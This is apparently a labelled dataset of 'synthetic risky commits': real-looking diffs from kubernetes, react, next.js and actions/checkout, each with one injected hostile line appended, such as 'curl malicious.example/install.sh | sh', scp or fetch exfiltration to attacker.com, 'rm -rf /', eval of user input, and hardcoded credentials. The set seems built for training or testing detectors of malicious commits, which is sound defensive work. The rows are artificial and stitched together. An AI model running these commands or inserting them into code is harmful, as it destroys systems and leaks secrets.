kubernetes/kubernetes,synthetic_404_3981,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,28,8,36,"var _ = SIGDescribe(""Terminate Pods"" func() { } } return false - } 20*time.Second 1*time.Second).Should(gomega.BeTrueBecause(""expected container to be ready"")) + } 20*time.Second 1*time.Second).Should(gomega.BeTrueBecause(""expected container to be not ready"")) err := client.Delete(context.Background() pod.Name metav1.DeleteOptions{})
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_405_3034,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,10,4,14,"-// @flow @validatePreserveExistingMemoizationGuarantees +// @flow @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useFragment} from 'react-relay'; import LogEvent from 'LogEvent'; import {useCallback useMemo} from 'react';
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_406_3653,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,15,5,20,"{ ""name"": ""create-next-app"" - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""keywords"": [ ""react"" ""next""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_407_5653,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,17,3,20,"## Input ```javascript +// @enablePreserveExistingMemoizationGuarantees:false import fbt from 'fbt'; /** export const FIXTURE_ENTRYPOINT = { ## Code ```javascript -import { c as _c } from ""react/compiler-runtime""; +import { c as _c } from ""react/compiler-runtime""; // @enablePreserveExistingMemoizationGuarantees:false import fbt from ""fbt""; /**
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_408_5496,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,20,9,29,"-// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; function Component({propA propB}) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_409_2530,Hendrik Liebau,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,11,9,20,"function enforceExperimentalFeatures( } } + // TODO: Remove this once using the debug channel is the default. + if ( + process.env.__NEXT_EXPERIMENTAL_DEBUG_CHANNEL === 'true' && + // We do respect an explicit value in the user config. + (config.experimental.reactDebugChannel === undefined || + (isDefaultConfig && !config.experimental.reactDebugChannel)) + ) { + config.experimental.reactDebugChannel = true + + if (configuredExperimentalFeatures) { + addConfiguredExperimentalFeature( + configuredExperimentalFeatures + 'reactDebugChannel' + true + 'enabled by `__NEXT_EXPERIMENTAL_DEBUG_CHANNEL`' + ) + } + } + // TODO: Remove this once we've made RDC for Navigations the default for PPR. if ( process.env.__NEXT_EXPERIMENTAL_PPR === 'true' &&
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_410_3526,Cory Miller,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,40,9,49,"--- name: uuid -version: 3.3.3 +version: 3.4.0 type: npm summary: RFC4122 (v1 v4 and v5) UUIDs -homepage: https://github.com/kelektiv/node-uuid#readme +homepage: license: mit licenses: - sources: LICENSE.md
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_411_1674,Luca Comellini,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,6,0,6,"function getSource(settings) { // Get commit information const commitInfo = yield git.log1(); // Log commit sha - yield git.log1(""--format='%H'""); + const commitSHA = yield git.log1('--format=%H'); + core.setOutput('commit' commitSHA.trim()); // Check for incorrect pull request merge commit yield refHelper.checkCommitInfo(settings.authToken commitInfo settings.repositoryOwner settings.repositoryName settings.ref settings.commit settings.githubServerUrl); } function run() { coreCommand.issueCommand('add-matcher' {} path.join(__dirname 'problem-matcher.json')); // Get sources yield gitSourceProvider.getSource(sourceSettings); + core.setOutput('ref' sourceSettings.ref); } finally { // Unregister problem matcher
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_412_5336,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,14,9,23,"""eslint-plugin-jsdoc"": ""48.0.4"" ""eslint-plugin-mdx"": ""3.1.5"" ""eslint-plugin-react"": ""7.35.0"" - ""eslint-plugin-react-hooks"": ""0.0.0-experimental-4fdf7cf2-20251003"" + ""eslint-plugin-react-hooks"": ""0.0.0-experimental-c7862584-20251006"" ""eslint-v8"": ""npm:eslint@^8.57.0"" ""event-stream"": ""4.0.1"" ""execa"": ""2.0.3"" ""pretty-ms"": ""7.0.0"" ""random-seed"": ""0.3.0"" ""react"": ""19.0.0"" - ""react-builtin"": ""npm:react@19.3.0-canary-4fdf7cf2-20251003"" + ""react-builtin"": ""npm:react@19.3.0-canary-c7862584-20251006"" ""react-dom"": ""19.0.0"" - ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-is-builtin"": ""npm:react-is@19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-server-dom-webpack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-4fdf7cf2-20251003"" + ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-c7862584-20251006"" + ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-c7862584-20251006"" + ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-c7862584-20251006"" + ""react-is-builtin"": ""npm:react-is@19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-c7862584-20251006"" + ""react-server-dom-webpack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-c7862584-20251006"" ""react-ssr-prepass"": ""1.0.8"" ""react-virtualized"": ""9.22.3"" ""relay-compiler"": ""13.0.2"" ""resolve-from"": ""5.0.0"" ""sass"": ""1.54.0"" ""satori"": ""0.15.2"" - ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-4fdf7cf2-20251003"" - ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-4fdf7cf2-20251003"" + ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-c7862584-20251006"" + ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-c7862584-20251006"" ""seedrandom"": ""3.0.5"" ""semver"": ""7.3.7"" ""serve-handler"": ""6.1.6"" ""@types/react-dom"": ""19.1.10"" ""@types/retry"": ""0.12.0"" ""jest-snapshot"": ""30.0.0-alpha.6"" - ""react"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-is"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""scheduler"": ""0.28.0-canary-4fdf7cf2-20251003"" + ""react"": ""19.3.0-canary-c7862584-20251006"" + ""react-dom"": ""19.3.0-canary-c7862584-20251006"" + ""react-is"": ""19.3.0-canary-c7862584-20251006"" + ""scheduler"": ""0.28.0-canary-c7862584-20251006"" } ""packageExtensions"": { ""eslint-plugin-react-hooks@0.0.0-experimental-6de32a5a-20250822"": {
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_413_1496,rongfu.leng,2025-10-15 12:40:40,Synthetic risky commit,config.env,35,4,39,"package resourcequota import ( ""context"" + ""fmt"" ""k8s.io/apimachinery/pkg/runtime"" ""k8s.io/apimachinery/pkg/util/validation/field"" func (resourcequotaStrategy) Validate(ctx context.Context obj runtime.Object) f // WarningsOnCreate returns warnings for the creation of the given object. func (resourcequotaStrategy) WarningsOnCreate(ctx context.Context obj runtime.Object) []string { - return nil + resourcequota := obj.(*api.ResourceQuota) + allWarnings := make([]string 0) + coreReosurces := []api.ResourceName{ + api.ResourceCPU api.ResourceMemory + api.ResourceStorage api.ResourceEphemeralStorage + } + for _ resourceName := range coreReosurces { + requestResourceName := fmt.Sprintf(""requests.%s"" resourceName) + requestResource requestOK := resourcequota.Spec.Hard[api.ResourceName(requestResourceName)] + if (resourceName == api.ResourceCPU || resourceName == api.ResourceMemory) && !requestOK { + requestResourceName = string(resourceName) + requestResource requestOK = resourcequota.Spec.Hard[api.ResourceName(requestResourceName)] + } + limitResourceName := fmt.Sprintf(""limits.%s"" resourceName) + limitResource limitOK := resourcequota.Spec.Hard[api.ResourceName(limitResourceName)] + if requestOK && limitOK && requestResource.Cmp(limitResource) == 1 { + allWarnings = append(allWarnings fmt.Sprintf(""Create ResourceQuota requests.%s: %s should be less than limits.%s: %s"" resourceName requestResource.String() resourceName limitResource.String())) + } + } + return allWarnings } // Canonicalize normalizes the object after validation.
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_414_8912,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,26,4,30,"--- name: undici -version: 5.28.4 +version: 5.29.0 type: npm summary: An HTTP/1.1 client written from scratch for Node.js homepage: https://undici.nodejs.org
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_415_2195,Eugene Choi,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,4,2,6,"* LICENSE file in the root directory of this source tree. */ -import {parse as babelParse ParseResult} from '@babel/parser'; -import * as HermesParser from 'hermes-parser'; -import * as t from '@babel/types'; -import BabelPluginReactCompiler { - CompilerError +import { CompilerErrorDetail CompilerDiagnostic - Effect - ErrorCategory - parseConfigPragmaForTests - ValueKind - type Hook - PluginOptions - CompilerPipelineValue - parsePluginOptions - printReactiveFunctionWithOutlined - printFunctionWithOutlined - type LoggerEvent } from 'babel-plugin-react-compiler'; -import {useDeferredValue useMemo} from 'react'; +import {useDeferredValue useMemo useState} from 'react'; import {useStore} from '../StoreContext'; import ConfigEditor from './ConfigEditor'; import Input from './Input'; -import { - CompilerOutput - CompilerTransformOutput - default as Output - PrintedCompilerPipelineValue -} from './Output'; -import {transformFromAstSync} from '@babel/core'; - -function parseInput( - input: string - language: 'flow' | 'typescript' -): ParseResult<t.File> { - // Extract the first line to quickly check for custom test directives - if (language === 'flow') { - return HermesParser.parse(input { - babel: true - flow: 'all' - sourceType: 'module' - enableExperimentalComponentSyntax: true - }); - } else { - return babelParse(input { - plugins: ['typescript' 'jsx'] - sourceType: 'module' - }) as ParseResult<t.File>; - } -} - -function invokeCompiler( - source: string - language: 'flow' | 'typescript' - options: PluginOptions -): CompilerTransformOutput { - const ast = parseInput(source language); - let result = transformFromAstSync(ast source { - filename: '_playgroundFile.js' - highlightCode: false - retainLines: true - plugins: [[BabelPluginReactCompiler options]] - ast: true - sourceType: 'module' - configFile: false - sourceMaps: true - babelrc: false - }); - if (result?.ast == null || result?.code == null || result?.map == null) { - throw new Error('Expected successful compilation'); - } - return { - code: result.code - sourceMaps: result.map - language - }; -} - -const COMMON_HOOKS: Array<[string Hook]> = [ - [ - 'useFragment' - { - valueKind: ValueKind.Frozen - effectKind: Effect.Freeze - noAlias: true - transitiveMixedData: true - } - ] - [ - 'usePaginationFragment' - { - valueKind: ValueKind.Frozen - effectKind: Effect.Freeze - noAlias: true - transitiveMixedData: true - } - ] - [ - 'useRefetchableFragment' - { - valueKind: ValueKind.Frozen - effectKind: Effect.Freeze - noAlias: true - transitiveMixedData: true - } - ] - [ - 'useLazyLoadQuery' - { - valueKind: ValueKind.Frozen - effectKind: Effect.Freeze - noAlias: true - transitiveMixedData: true - } - ] - [ - 'usePreloadedQuery' - { - valueKind: ValueKind.Frozen - effectKind: Effect.Freeze - noAlias: true - transitiveMixedData: true - } - ] -]; - -function parseOptions( - source: string - mode: 'compiler' | 'linter' - configOverrides: string -): PluginOptions { - // Extract the first line to quickly check for custom test directives - const pragma = source.substring(0 source.indexOf('\n')); - - const parsedPragmaOptions = parseConfigPragmaForTests(pragma { - compilationMode: 'infer' - environment: - mode === 'linter' - ? { - // enabled in compiler - validateRefAccessDuringRender: false - // enabled in linter - validateNoSetStateInRender: true - validateNoSetStateInEffects: true - validateNoJSXInTryStatements: true - validateNoImpureFunctionsInRender: true - validateStaticComponents: true - validateNoFreezingKnownMutableFunctions: true - validateNoVoidUseMemo: true - } - : { - /* use defaults for compiler mode */ - } - }); - - // Parse config overrides from config editor - let configOverrideOptions: any = {}; - const configMatch = configOverrides.match(/^\s*import.*?\n\n\((.*)\)/s); - if (configOverrides.trim()) { - if (configMatch && configMatch[1]) { - const configString = configMatch[1].replace(/satisfies.*$/ '').trim(); - configOverrideOptions = new Function(`return (${configString})`)(); - } else { - throw new Error('Invalid override format'); - } - } - - const opts: PluginOptions = parsePluginOptions({ - ...parsedPragmaOptions - ...configOverrideOptions - environment: { - ...parsedPragmaOptions.environment - ...configOverrideOptions.environment - customHooks: new Map([...COMMON_HOOKS]) - } - }); - - return opts; -} - -function compile( - source: string - mode: 'compiler' | 'linter' - configOverrides: string -): [CompilerOutput 'flow' | 'typescript' PluginOptions | null] { - const results = new Map<string Array<PrintedCompilerPipelineValue>>(); - const error = new CompilerError(); - const otherErrors: Array<CompilerErrorDetail | CompilerDiagnostic> = []; - const upsert: (result: PrintedCompilerPipelineValue) => void = result => { - const entry = results.get(result.name); - if (Array.isArray(entry)) { - entry.push(result); - } else { - results.set(result.name [result]); - } - }; - let language: 'flow' | 'typescript'; - if (source.match(/\@flow/)) { - language = 'flow'; - } else { - language = 'typescript'; - } - let transformOutput; - - let baseOpts: PluginOptions | null = null; - try { - baseOpts = parseOptions(source mode configOverrides); - } catch (err) { - error.details.push( - new CompilerErrorDetail({ - category: ErrorCategory.Config - reason: `Unexpected failure when transforming configs! \n${err}` - loc: null - suggestions: null - }) - ); - } - if (baseOpts) { - try { - const logIR = (result: CompilerPipelineValue): void => { - switch (result.kind) { - case 'ast': { - break; - } - case 'hir': { - upsert({ - kind: 'hir' - fnName: result.value.id - name: result.name - value: printFunctionWithOutlined(result.value) - }); - break; - } - case 'reactive': { - upsert({ - kind: 'reactive' - fnName: result.value.id - name: result.name - value: printReactiveFunctionWithOutlined(result.value) - }); - break; - } - case 'debug': { - upsert({ - kind: 'debug' - fnName: null - name: result.name - value: result.value - }); - break; - } - default: { - const _: never = result; - throw new Error(`Unhandled result ${result}`); - } - } - }; - // Add logger options to the parsed options - const opts = { - ...baseOpts - logger: { - debugLogIRs: logIR - logEvent: (_filename: string | null event: LoggerEvent): void => { - if (event.kind === 'CompileError') { - otherErrors.push(event.detail); - } - } - } - }; - transformOutput = invokeCompiler(source language opts); - } catch (err) { - /** - * error might be an invariant violation or other runtime error - * (i.e. object shape that is not CompilerError) - */ - if (err instanceof CompilerError && err.details.length > 0) { - error.merge(err); - } else { - /** - * Handle unexpected failures by logging (to get a stack trace) - * and reporting - */ - error.details.push( - new CompilerErrorDetail({ - category: ErrorCategory.Invariant - reason: `Unexpected failure when transforming input! \n${err}` - loc: null - suggestions: null - }) - ); - } - } - } - // Only include logger errors if there weren't other errors - if (!error.hasErrors() && otherErrors.length !== 0) { - otherErrors.forEach(e => error.details.push(e)); - } - if (error.hasErrors()) { - return [{kind: 'err' results error} language baseOpts]; - } - return [ - {kind: 'ok' results transformOutput errors: error.details} - language - baseOpts - ]; -} +import {CompilerOutput default as Output} from './Output'; +import {compile} from '../../lib/compilation'; +import prettyFormat from 'pretty-format'; export default function Editor(): JSX.Element { const store = useStore(); export default function Editor(): JSX.Element { () => compile(deferredStore.source 'linter' deferredStore.config) [deferredStore.source deferredStore.config] ); + const [formattedAppliedConfig setFormattedAppliedConfig] = useState(''); let mergedOutput: CompilerOutput; let errors: Array<CompilerErrorDetail | CompilerDiagnostic>; export default function Editor(): JSX.Element { mergedOutput = compilerOutput; errors = compilerOutput.error.details; } + + if (appliedOptions) { + const formatted = prettyFormat(appliedOptions { + printFunctionName: false + printBasicPrototype: false + }); + if (formatted !== formattedAppliedConfig) { + setFormattedAppliedConfig(formatted); + } + } + return ( <> <div className=""relative flex top-14""> <div className=""flex-shrink-0""> - <ConfigEditor appliedOptions={appliedOptions} /> + <ConfigEditor formattedAppliedConfig={formattedAppliedConfig} /> </div> <div className=""flex flex-1 min-w-0""> <Input language={language} errors={errors} />
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_416_7809,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,config.env,30,3,33,"--- +### 7.0.0 +Oct 2 2025 + +Add a ""suspended by"" section showing all causes of why the inspected element suspended. This includes: + +- `await` in Server Components +- `React.lazy` +- `use()` +- suspensey images CSS and fonts + +Add a Code Editor Sidebar Pane in the Chrome Sources Tab (@sebmarkbage [#33968](https://github.com/facebook/react/pull/33968) [#33987](https://github.com/facebook/react/pull/33987) [#33988](https://github.com/facebook/react/pull/33988)) + +Add Option to Open Local Files directly in External Editor (@sebmarkbage [#33983](https://github.com/facebook/react/pull/33983) [#33985](https://github.com/facebook/react/pull/33985) [#33965](https://github.com/facebook/react/pull/33965)) + +#### Other changes + +- Allow inspection of React tree before streaming has finished (@eps1lon [#34360](https://github.com/facebook/react/pull/34360)) +- Always attempt to mount dehydrated roots (@eps1lon [#34209](https://github.com/facebook/react/pull/34209)) +- Show `name` prop of Suspense / Activity in the Components Tree view (@sebmarkbage [#34135](https://github.com/facebook/react/pull/34135)) +- 1st class support of used Thenables (@sebmarkbage @eps1lon: [#32989](https://github.com/facebook/react/pull/32989) [#34097](https://github.com/facebook/react/pull/34097)) +- Allow inspecting cause name message stack of Errors in props (@eps1lon [#33023](https://github.com/facebook/react/pull/33023)) +- Allow Introspection of React Elements and React.lazy (@sebmarkbage [#34129](https://github.com/facebook/react/pull/34129)) +- Fix ""View source"" for sources with URLs that aren't normalized (@eps1lon [#32951](https://github.com/facebook/react/pull/32951)) +- Fix symbolication with Index Source Maps (@eps1lon [#34300](https://github.com/facebook/react/pull/34300)) +- Ignore List Stack Traces (@sebmarkbage [#34210](https://github.com/facebook/react/pull/34210)) +- Linkify Source View (@sebmarkbage [#33954](https://github.com/facebook/react/pull/33954)) +- Only show state for ClassComponents (@sebmarkbage [#34091](https://github.com/facebook/react/pull/34091)) +- Show Owner Stacks in ""rendered by"" View (@sebmarkbage [#34130](https://github.com/facebook/react/pull/34130)) +- Stop mounting empty roots (@eps1lon [#34467](https://github.com/facebook/react/pull/34467)) +- Show changed hooks names in the Profiler tab (@piotrski [#31398](https://github.com/facebook/react/pull/31398)) +- Display native tag for host components for Native (@ruslan [#32762](https://github.com/facebook/react/pull/32762)) +- Static Components panel layout (@ruslan [#33696](https://github.com/facebook/react/pull/33696) [#33517](https://github.com/facebook/react/pull/33517) [#34088](https://github.com/facebook/react/pull/34088)) +- Add Badge to Owners and sometimes stack traces (@sebmarkbage [#34106](https://github.com/facebook/react/pull/34106)) +- Make a non-editable name of KeyValue clickable ([34095](https://github.com/facebook/react/pull/34095)) +- Only inspect elements on left mouseclick (@eps1lon [#34361](https://github.com/facebook/react/pull/34361)) +- Rerender when the browser theme changes (@sebmarkbage [#33992](https://github.com/facebook/react/pull/33992)) +- Stop using native `title` for buttons/icons (@eps1lon [#34379](https://github.com/facebook/react/pull/34379)) +- Style clickable Owner components with angle brackets and bold (@sebmarkbage [#34096](https://github.com/facebook/react/pull/34096)) +- Swap Components tab layout based on container size (@eps1lon [#34035](https://github.com/facebook/react/pull/34035)) +- Use Visually Lighter Skeletons (@sebmarkbage [#34185](https://github.com/facebook/react/pull/34185)) + +--- + ### 6.1.5 July 4 2025
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_417_3353,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,21,5,26,"pub struct ExperimentalConfig { trust_host_header: Option<bool> url_imports: Option<serde_json::Value> - view_transition: Option<bool> /// This option is to enable running the Webpack build in a worker thread /// (doesn't apply to Turbopack). webpack_build_worker: Option<bool> impl NextConfig { Vc::cell(self.experimental.taint.unwrap_or(false)) } - #[turbo_tasks::function] - pub fn enable_view_transition(&self) -> Vc<bool> { - Vc::cell(self.experimental.view_transition.unwrap_or(false)) - } - #[turbo_tasks::function] pub fn enable_cache_components(&self) -> Vc<bool> { Vc::cell(self.experimental.cache_components.unwrap_or(false))
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_418_3142,Benjamin Elder,2025-10-15 12:40:40,Synthetic risky commit,run.sh,33,8,41,"func AfterSuiteActions(ctx context.Context) { if framework.TestContext.ReportDir != """" { framework.CoreDump(framework.TestContext.ReportDir) } + // TODO: nothing is using this? what should we do with it? if framework.TestContext.GatherSuiteMetricsAfterTest { if err := gatherTestSuiteMetrics(ctx); err != nil { framework.Logf(""Error gathering metrics: %v"" err)
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_419_6228,Tobias Koppers,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,30,1,31,"-import './globals.css' - -import { ReactNode } from 'react' -export default function Root({ children }: { children: ReactNode }) { - return ( - <html> - <body>{children}</body> - </html> - ) -}
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_420_8366,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,10,1,11,"{ ""name"": ""@next/polyfill-nomodule"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""description"": ""A polyfill for non-dead nomodule browsers."" ""main"": ""dist/polyfill-nomodule.js"" ""license"": ""MIT""
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_421_5754,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,40,6,46,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix);
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_422_3616,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,run.sh,37,5,42,"## Input ```javascript -// @enableAssumeHooksFollowRulesOfReact @enableTransitivelyFreezeFunctionExpressions +// @enableAssumeHooksFollowRulesOfReact @enableTransitivelyFreezeFunctionExpressions @enablePreserveExistingMemoizationGuarantees:false function Component() { const items = useItems(); const filteredItems = useMemo( function Component() { ## Code ```javascript -import { c as _c } from ""react/compiler-runtime""; // @enableAssumeHooksFollowRulesOfReact @enableTransitivelyFreezeFunctionExpressions +import { c as _c } from ""react/compiler-runtime""; // @enableAssumeHooksFollowRulesOfReact @enableTransitivelyFreezeFunctionExpressions @enablePreserveExistingMemoizationGuarantees:false function Component() { const $ = _c(6); const items = useItems();
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_423_3610,Cory Miller,2025-10-15 12:40:40,Synthetic risky commit,config.env,33,7,40,"--- name: ""@octokit/auth-token"" -version: 2.5.0 +version: 4.0.0 type: npm summary: GitHub API token authentication for browsers and Node.js homepage:
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_424_6055,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,config.env,2,1,3,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_425_9281,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,config.env,16,3,19,"--- name: ""@octokit/plugin-paginate-rest"" -version: 9.2.1 +version: 9.2.2 type: npm summary: Octokit plugin to paginate REST API endpoint responses -homepage: +homepage: license: mit licenses: - sources: LICENSE
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_426_6781,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,4,4,8,"{ ""name"": ""react-is"" - ""version"": ""19.3.0-canary-85c427d8-20251003"" + ""version"": ""19.3.0-canary-4fdf7cf2-20251003"" ""description"": ""Brand checking of React Elements."" ""main"": ""index.js"" ""sideEffects"": false
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_427_8710,Jiwon Choi,2025-10-15 12:40:40,Synthetic risky commit,run.sh,35,0,35,"jobs: export IS_WEBPACK_TEST=1 export NEXT_TEST_MODE=start export NEXT_TEST_REACT_VERSION=""${{ matrix.react }}"" + export __NEXT_EXPERIMENTAL_ISOLATED_DEV_BUILD=true node run-tests.js --timings -g ${{ matrix.group }} --type production stepName: 'test-prod-react-${{ matrix.react }}-${{ matrix.group }}'
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_428_8060,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,17,5,22,"* @flow */ import type {ReactContext} from 'shared/ReactTypes'; -import type { - Element - SuspenseNode -} from 'react-devtools-shared/src/frontend/types'; +import type {SuspenseNode} from 'react-devtools-shared/src/frontend/types'; import type Store from '../../store'; import * as React from 'react'; import {StoreContext} from '../context'; export type SuspenseTreeState = { lineage: $ReadOnlyArray<SuspenseNode['id']> | null roots: $ReadOnlyArray<SuspenseNode['id']> - selectedRootID: SuspenseNode['id'] | null selectedSuspenseID: SuspenseNode['id'] | null timeline: $ReadOnlyArray<SuspenseNode['id']> timelineIndex: number | -1 type Props = { children: React$Node }; -function getDefaultRootID(store: Store): Element['id'] | null { - const designatedRootID = store.roots.find(rootID => { - const suspense = store.getSuspenseByID(rootID); - return ( - store.supportsTogglingSuspense(rootID) && - suspense !== null && - suspense.children.length > 1 - ); - }); - - return designatedRootID === undefined ? null : designatedRootID; -} - function getInitialState(store: Store): SuspenseTreeState { - let initialState: SuspenseTreeState; const uniqueSuspendersOnly = true; - const selectedRootID = getDefaultRootID(store); - // TODO: Default to nearest from inspected - if (selectedRootID === null) { - initialState = { - selectedSuspenseID: null - lineage: null - roots: store.roots - selectedRootID - timeline: [] - timelineIndex: -1 - hoveredTimelineIndex: -1 - uniqueSuspendersOnly - playing: false - }; - } else { - const timeline = store.getSuspendableDocumentOrderSuspense( - selectedRootID - uniqueSuspendersOnly - ); - const timelineIndex = timeline.length - 1; - const selectedSuspenseID = - timelineIndex === -1 ? null : timeline[timelineIndex]; - const lineage = - 